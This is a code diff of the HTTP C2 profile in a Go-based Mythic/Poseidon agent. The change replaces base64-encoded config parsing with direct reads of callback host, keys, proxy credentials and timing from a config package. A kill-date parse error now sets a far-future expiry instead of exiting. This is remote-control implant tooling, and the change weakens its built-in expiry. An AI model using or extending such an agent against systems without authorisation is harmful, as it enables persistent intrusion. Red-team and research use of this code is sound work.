@@ -6,114 +6,24 @@ import (
 	"bytes"
 	"crypto/rsa"
 	"encoding/base64"
-	"io"
-	"os"
-
-	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
-	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils"
-
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
 	"net/http"
 	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"time"
 
 	// Poseidon
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/crypto"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
 )
-
-// HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
-// base64 encoded version of the JSON initial configuration of HTTP
-var http_initial_config string
-
-type HTTPInitialConfig struct {
-	CallbackHost           string
-	CallbackPort           uint
-	Killdate               string
-	Interval               uint
-	Jitter                 uint
-	PostURI                string
-	GetURI                 string
-	QueryPathName          string
-	EncryptedExchangeCheck bool
-	Headers                map[string]string
-	AESPSK                 string
-	ProxyPort              uint
-	ProxyUser              string
-	ProxyPass              string
-	ProxyHost              string
-	ProxyBypass            bool
-}
-
-func (e *HTTPInitialConfig) parseMapStringString(configMap map[string]interface{}) map[string]string {
-	serverHeaders := make(map[string]string)
-	if configMap != nil {
-		for j, k := range configMap {
-			serverHeaders[j] = k.(string)
-		}
-	}
-	return serverHeaders
-}
-func (e *HTTPInitialConfig) UnmarshalJSON(data []byte) error {
-	alias := map[string]interface{}{}
-	err := json.Unmarshal(data, &alias)
-	if err != nil {
-		return err
-	}
-	if v, ok := alias["callback_host"]; ok {
-		e.CallbackHost = v.(string)
-	}
-	if v, ok := alias["callback_port"]; ok {
-		e.CallbackPort = uint(v.(float64))
-	}
-	if v, ok := alias["killdate"]; ok {
-		e.Killdate = v.(string)
-	}
-	if v, ok := alias["callback_interval"]; ok {
-		e.Interval = uint(v.(float64))
-	}
-	if v, ok := alias["callback_jitter"]; ok {
-		e.Jitter = uint(v.(float64))
-	}
-	if v, ok := alias["post_uri"]; ok {
-		e.PostURI = v.(string)
-	}
-	if v, ok := alias["get_uri"]; ok {
-		e.GetURI = v.(string)
-	}
-	if v, ok := alias["query_path_name"]; ok {
-		e.QueryPathName = v.(string)
-	}
-	if v, ok := alias["encrypted_exchange_check"]; ok {
-		e.EncryptedExchangeCheck = v.(bool)
-	}
-	if v, ok := alias["headers"]; ok {
-		e.Headers = e.parseMapStringString(v.(map[string]interface{}))
-	}
-	if v, ok := alias["AESPSK"]; ok {
-		e.AESPSK = v.(string)
-	}
-	if v, ok := alias["proxy_port"]; ok {
-		e.ProxyPort = uint(v.(float64))
-	}
-	if v, ok := alias["proxy_user"]; ok {
-		e.ProxyUser = v.(string)
-	}
-	if v, ok := alias["proxy_pass"]; ok {
-		e.ProxyPass = v.(string)
-	}
-	if v, ok := alias["proxy_host"]; ok {
-		e.ProxyHost = v.(string)
-	}
-	if v, ok := alias["proxy_bypass"]; ok {
-		e.ProxyBypass = v.(bool)
-	}
-	return nil
-}
 
 type C2HTTP struct {
 	BaseURL               string
@@ -182,63 +92,48 @@ func parseURLAndPort(host string, port uint) string {
 	return final_url
 }
 func init() {
-	initialConfigBytes, err := base64.StdEncoding.DecodeString(http_initial_config)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to decode initial http config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	initialConfig := HTTPInitialConfig{}
-	err = json.Unmarshal(initialConfigBytes, &initialConfig)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial http config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	//fmt.Printf("final url: %s\n", final_url)
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
+	// Read directly from config package instead of decoding base64
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", config.HTTPKilldate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
-		os.Exit(1)
+		utils.PrintDebug(fmt.Sprintf("error parsing killdate, using far future: %v\n", err))
+		killDateTime = time.Date(2099, 12, 31, 0, 0, 0, 0, time.UTC)
 	}
+
 	profile := C2HTTP{
-		BaseURL:               parseURLAndPort(initialConfig.CallbackHost, initialConfig.CallbackPort),
-		PostURI:               initialConfig.PostURI,
-		ProxyUser:             initialConfig.ProxyUser,
-		ProxyPass:             initialConfig.ProxyPass,
-		Key:                   initialConfig.AESPSK,
+		BaseURL:               parseURLAndPort(config.HTTPCallbackHost, uint(config.HTTPCallbackPort)),
+		PostURI:               config.HTTPPostUri,
+		ProxyUser:             config.HTTPProxyUser,
+		ProxyPass:             config.HTTPProxyPass,
+		Key:                   config.HTTPAesPsk,
 		Killdate:              killDateTime,
 		ShouldStop:            true,
 		stoppedChannel:        make(chan bool, 1),
 		interruptSleepChannel: make(chan bool, 1),
 	}
 
-	// Convert sleep from string to integer
-	profile.Interval = int(initialConfig.Interval)
+	profile.Interval = config.HTTPInterval
 	if profile.Interval < 0 {
 		profile.Interval = 0
 	}
 
-	// Convert jitter from string to integer
-	profile.Jitter = int(initialConfig.Jitter)
+	profile.Jitter = config.HTTPJitter
 	if profile.Jitter < 0 {
 		profile.Jitter = 0
 	}
 
-	// Add HTTP Headers
-	profile.HeaderList = initialConfig.Headers
+	profile.HeaderList = config.HTTPHeaders
 
-	// Add proxy info if set
-	if len(initialConfig.ProxyHost) > 3 {
-		profile.ProxyURL = parseURLAndPort(initialConfig.ProxyHost, initialConfig.ProxyPort)
-
-		if len(initialConfig.ProxyUser) > 0 && len(initialConfig.ProxyPass) > 0 {
-			profile.ProxyUser = initialConfig.ProxyUser
-			profile.ProxyPass = initialConfig.ProxyPass
+	if config.HTTPProxyHost != "" && len(config.HTTPProxyHost) > 3 {
+		profile.ProxyURL = parseURLAndPort(config.HTTPProxyHost, uint(config.HTTPProxyPort))
+		if config.HTTPProxyUser != "" && config.HTTPProxyPass != "" {
+			profile.ProxyUser = config.HTTPProxyUser
+			profile.ProxyPass = config.HTTPProxyPass
 		}
 	}
 
-	// Convert ignore_proxy from string to bool
-	profile.ProxyBypass = initialConfig.ProxyBypass
-	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
+	profile.ProxyBypass = config.HTTPProxyBypass
+	profile.ExchangingKeys = config.HTTPEncryptedExchange
 
 	RegisterAvailableC2Profile(&profile)
 }
